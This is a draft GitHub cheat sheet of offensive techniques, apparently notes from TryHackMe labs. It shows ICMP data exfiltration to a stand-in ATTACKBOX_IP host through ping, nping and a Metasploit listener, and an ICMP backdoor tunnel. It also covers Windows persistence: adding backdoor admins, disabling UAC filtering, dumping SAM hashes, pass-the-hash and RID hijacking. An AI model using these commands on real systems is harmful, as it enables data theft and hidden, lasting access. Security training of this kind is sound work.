> [!Note]
> Heavy work in progress

<p align="center"><img alt="" src="" width="300" /></p>

*<p align="center">A curated list of steps/processes to use when tackling a certain problem.</p>*

When dealing with a certain challenge, you have to come up with a plan to come up with a solution. But you are not the first one to have dealt with this. So here I present a list of processes I have used that could help me and others finding the right programs/commands that they need.

<p align="center"><img alt="Need a better meme here.." src="https://github.com/Kevinovitz/cyber-security-megathread/raw/main/images/Cyber_Meme_07.png" width="300" /></p>

----

### Subjects

- [Knowledge Bases](#knowledge-bases)
- [Cheatsheets](#cheatsheets)
- [Tools Top Tips](#tools-top-tips)
- [Data Exfiltration](#data-exfiltration)
- [Misc](#misc)
- [Persistence](#persistence)

## Knowledge Bases

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

## Cheatsheets

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

## Tools Top Tips

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

## Data Exfiltration



### TCP Socket



### SSH



### HTTP(S)



### ICMP

Sending data with an ICMP ping packet

#### Manually

Convert payload into hex, for example with xxd.

```bash
echo "thm:tryhackme" | xxd -p
```

Send a ping request with the payload.

```bash
ping <IP> -c <nr of requests> -p <payload in hex format>

ping 10.10.230.138 -c 1 -p 74686d3a7472796861636b6d650a 
```

Capture the request with e.g., Wireshark.

#### MetaSploit

Select the `icmp_exfill` module to set a listener to capture any ICMP packets. It starts recording upon receiving a trigger and ends when an EOF trigger is received.

Set the correct interface to listen on.

```bash
use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src ATTACKBOX_IP
set INTERFACE eth0
run
```

Now Metasploit is waiting for a beginning of file trigger as stated.

Using nping or regular ping send a BOF trigger to start recording data (from the victim machine).

```bash
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
```

Send the rest of the data in a similar manner.

Send the EOF trigger.

```bash
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "OEF"
```

Find the loot in the location as stated (on the attack machine).

#### Tunneling

ICMPDoor tool can be used to create an ICMP tunnel.

🔗 https://github.com/krabelize/icmpdoor

Setup a host on the victim machine.

```bash
sudo icmpdoor -i eth0 -d 192.168.0.133
```

Setup a client on the attack machine

```bash
sudo icmp-cnc -i eth1 -d 192.168.0.121
```

Send commands to the victim machine as usual.

### DNS



## Misc



## Persistence

### Linux

### Windows

#### **Tampering With Unprivileged Accounts**
	
##### *Assign Group Memberships*
	
- Make user part of Administrators group.

```cmd
net localgroup "Administrators" thmuser1 /add
```

- If thats to suspicious, add to Backup Operators group and Remote Management for RDP.

```cmd
net localgroup "Backup Operators" thmuser1 /add
net localgroup "Remote Management Users" thmuser1 /add
```

- Disable UAC privilige stripping for remote users.

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- Remote into the machine (RDP or Evil-WinRM)

```console
evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
```

- Export and download SAM and SYSTEM registry hives.

```console
reg save hklm\system system.bak
reg save hklm\sam sam.bak

download system.bak
download sam.bak
```

- Dump hashes from SAM and SYSTEM hives.

```console
python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

- Pass the hash with admin account.

```console
evil-winrm -i 10.10.112.47 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```

##### *Special Privileges and Security Descriptors*

- Add `SeBackupPrivilege` and `SeRestorePrivilege` to an account.

```cmd
secedit /export /cfg config.ini
secedit /import /cfg config.ini /db config.db
secedit /configure /db config.db /cfg config.ini
```

- Change WinRM security descriptor and add user here with full control.

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

- Disable UAC privilige stripping for remote users.

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

##### *RID Hijacking*

- Find RIDs of user and admin user.

```cmd
wmic useraccount get name,sid
```

- Open regedit with privileges (tool must be present on target system).

```cmd
PsExec.exe -i -s regedit
```

- Find users here in the registry: `HKLM\SAM\SAM\Domains\Account\Users\` .

- Convert (admin) RID to hex value (i.e., 1010 = 0x1F4) and change F variable within the correct user key with the RID of the admin account (little endian notation = 04F1 -> F4 01).

- Admin hex RID ussualy is F4 01, put this on line 0030 of the F variable.

<!--- 

## TITLE

### Usefull documentation

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

### Related tools

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

<br>

--->
